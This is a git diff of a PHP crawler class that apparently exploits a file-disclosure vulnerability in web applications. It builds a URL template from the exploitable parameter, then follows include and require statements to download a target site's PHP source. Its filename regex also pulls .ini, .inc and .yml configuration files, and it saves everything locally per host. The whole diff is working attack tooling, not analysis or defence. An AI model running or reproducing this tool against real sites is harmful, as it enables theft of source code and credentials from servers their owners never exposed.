@@ -25,12 +25,18 @@ class CrawlerStaticFil
 
     public $urlBaseExploit;
 
+    public $folderSave;
+
     public function __construct($commandData,$url)
     {
+
+        echo $url."\n";
         $this->commandData = array_merge($this->defaultEnterData(), $commandData);
         $this->url =$url;
         $this->file =$this->readFile($url);
-        $this->language= $this->checkLanguage();
+        $this->language = $this->checkLanguage();
+        $this->folderSave = $this->getPatchFolder();
+        $this->saveFile($this->file,$this->getNameFile($url));
         $this->urlBaseExploit = $this->getBaseExploit();
 
 
@@ -50,38 +56,87 @@ class CrawlerStaticFil
 
     public function getAllFiles(){
 
-        $files=$this->getIncludes($this->file);
+        $results['includes']=$this->downloadAllFilesByInclude();
+//        $results['links']=
 
-        echo $this->url."\n";
-        if($files){
-            foreach($files as $file){
-                echo $url=$this->generateUrl($file)."\n";
-                $body = $this->readFile($url);
-                $newFiles=$this->getIncludes($body);
-                if($newFiles){
-                    $files=array_merge($newFiles,$files);
+        return $results;
+    }
+
+    protected function downloadAllFilesByInclude(){
+        $urlFiles=$this->getIncludes($this->file);
+        $allUrlFiles=$urlFiles;
+        $loop=true;
+
+        while($loop==true){
+            $newUrlFiles=array();
+            foreach($urlFiles as $urlFile){
+                echo $urlFile."\n";
+                $body = $this->readFile($urlFile);
+                $this->saveFile($body,$this->getNameFile($urlFile));
+                $cacheUrlFiles=$this->getIncludes($body,$urlFile);
+                if($cacheUrlFiles){
+                    $newUrlFiles=array_merge($cacheUrlFiles,$newUrlFiles);
+                }
+            }
+
+            $checktNewsFiles=array_diff($newUrlFiles,$allUrlFiles);
+            $urlFiles=$checktNewsFiles;
+            if(empty($checktNewsFiles)){
+                $loop=false;
+            }else{
+                $allUrlFiles=array_merge($urlFiles,$allUrlFiles);
+            }
+        }
+
+        return $allUrlFiles;
+    }
+
+    private function saveFile($file,$nameFile){
+
+        $myfile = fopen($this->folderSave."/".str_replace("/","-",$nameFile), "w") or die("Unable to open file!");
+        fwrite($myfile, $file);
+        fclose($myfile);
+
+    }
+
+    private function createFolder($folder){
+
+        $pathname="results/".$folder;
+        if(is_dir($pathname)){
+            return $this->folderSave = $pathname;
+        }
+
+        $valid= mkdir($pathname);
+        if($valid){
+            return $this->folderSave = $pathname;
+        }
+        return false;
+    }
+
+    private function generateUrl($file,$patchFileNow=false){
+        //echo $file."**";
+        return str_replace("######",$file,$this->getBaseExploit($patchFileNow));
+    }
+
+    public function getIncludes($file,$patchFileNow=false){
+
+        $resultFinal=array();
+        $isValid = preg_match_all("/(include|require|require_once|include_once)(.+|)\((.+|)(\"|\')(.+?)(\"|\')\)/i", $file, $m);
+
+        if ($isValid) {
+            $results=$this->sanitazePregMatchAll($m);
+            if($patchFileNow){
+                foreach($results as $result){
+                    $resultFinal[]=$this->generateUrl($result,$patchFileNow);
+                }
+            }else{
+                foreach($results as $result){
+                    $resultFinal[]=$this->generateUrl($result);
                 }
 
             }
-        }
-        $files[]=$this->url;
-        var_dump($files);
-        exit();
 
-    }
-
-    private function generateUrl($file){
-        //echo $file."**";
-        return str_replace("######",$file,$this->getBaseExploit());
-    }
-
-    public function getIncludes($file){
-
-        $isValid = preg_match_all("/include\((\"|\')(.+?)(\"|\')\)|include (\"|\')(.+?)(\"|\')|include_once\((\"|\')(.+?)(\"|\')\)|include_once (\"|\')(.+?)(\"|\')|require\((\"|\')(.+?)(\"|\')\)|require (\"|\')(.+?)(\"|\')|require_once \((\"|\')(.+?)(\"|\')\)|require_once (\"|\')(.+?)(\"|\')/i", $file, $m);
-        //var_dump($file);
-        if ($isValid) {
-            $results=$this->sanitazePregMatchAll($m);
-            return $results;
+            return $resultFinal;
         }
 
         return false;
@@ -121,7 +176,8 @@ class CrawlerStaticFil
             ],
         ]);
         try {
-            return $client->get($url)->getBody()->getContents();
+            $resultBody = $client->get($url)->getBody()->getContents();
+            return $resultBody;
         } catch (\Exception $e) {
             echo '#';
         }
@@ -142,19 +198,39 @@ class CrawlerStaticFil
         return $result[1];
     }
 
-    protected function getBaseExploit()
+    protected function getBaseExploit($url=false)
     {
-        $validResult = preg_match("/." . $this->language . ".*?(=|\/)(.+?)." . $this->language . "/i", $this->url, $m);
+        if(!$url){
+            $url=$this->url;
+        }
+
+        $validResult = preg_match("/." . $this->language . ".*?(=|\/)(.+?)." . $this->language . "/i", $url, $m);
         if ($validResult) {
             $baseUrlTrash = $m[2] . "." . $this->language;
             $explodeBar = explode("/", $baseUrlTrash);
             if (!isset($explodeBar[1])) {
-                return str_replace($baseUrlTrash, "######", $this->url);
+                return str_replace($baseUrlTrash, "######", $url);
             }
             array_pop($explodeBar);
-            return str_replace($baseUrlTrash, implode("/", $explodeBar) . "/######", $this->url);
+            return str_replace($baseUrlTrash, implode("/", $explodeBar) . "/######", $url);
 
         }
+    }
+
+    protected function getNameFile($url){
+        //$validResult = preg_match("/." . $this->language . ".*?(=|\/)(.+?)." . $this->language . "/i", $url, $m);
+        $validResult = preg_match("/.".$this->language.".*?(=|\/)(.+?)\.(".$this->language."|ini|inc|yml)/i", $url, $m);
+
+        if ($validResult) {
+            return $m[2] . "." . $m[3];
+        }
+        return false;
+
+    }
+
+    protected function getPatchFolder(){
+        $urlExplode=parse_url($this->url);
+        return $this->createFolder($urlExplode['host']);
     }
 
 
